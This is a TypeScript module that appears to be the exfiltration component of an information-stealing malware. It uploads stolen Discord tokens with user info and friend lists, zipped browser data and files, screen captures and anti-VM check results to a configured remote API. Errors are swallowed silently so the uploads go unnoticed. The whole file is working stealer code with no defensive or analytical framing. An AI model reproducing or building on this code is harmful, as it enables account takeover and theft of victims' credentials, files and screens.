import axios from 'axios';
import fs from 'fs';
import path from 'path';
import FormData from 'form-data';
import { API_KEY, BASE_API_URL, BUILD_ID } from '../config/constants';

async function sendToApi(endpoint: string, data: any, isMultipart: boolean = false): Promise<void> {
    try {
        const url = `${BASE_API_URL}${endpoint}`;
        const headers: any = isMultipart ? (data as FormData).getHeaders() : { 'Content-Type': 'application/json' };

        headers['X-Build-ID'] = BUILD_ID;
        headers['X-Api-KEY'] = API_KEY;

        await axios.post(url, data, {
            headers,
            maxBodyLength: Infinity
        });
    } catch (error: unknown) {
    }
}

export async function sendDiscordToken(token: string, userInfo?: any, friends?: any[]): Promise<void> {
    const payload = {
        token,
        userInfo,
        friends
    };
    await sendToApi('/discord', payload);
}

export async function sendBrowserData(zipPath: string, summary: string): Promise<void> {
    if (!fs.existsSync(zipPath)) return;

    const form = new FormData();
    form.append('file', fs.createReadStream(zipPath), {
        filename: path.basename(zipPath),
    });
    form.append('summary', `\`\`\`${summary}\`\`\``);

    await sendToApi('/browser', form, true);
}

export async function sendFilesData(zipPath: string, contentMessage: string): Promise<void> {
    if (!fs.existsSync(zipPath)) return;

    const form = new FormData();
    form.append('file', fs.createReadStream(zipPath), {
        filename: path.basename(zipPath),
    });
    form.append('message', contentMessage);

    await sendToApi('/files', form, true);
}

export async function sendGenericMessage(message: string): Promise<void> {
    await sendToApi('/log', { message });
}
export async function sendVmInfo(data: any): Promise<void> {
    await sendToApi('/antivm', { data });
    return;
}

export async function sendErrorLog(err: any): Promise<void> {

    await sendToApi('/err', err);
}

export async function sendCapture(img: any) {
    await sendToApi("/capture", { img })

}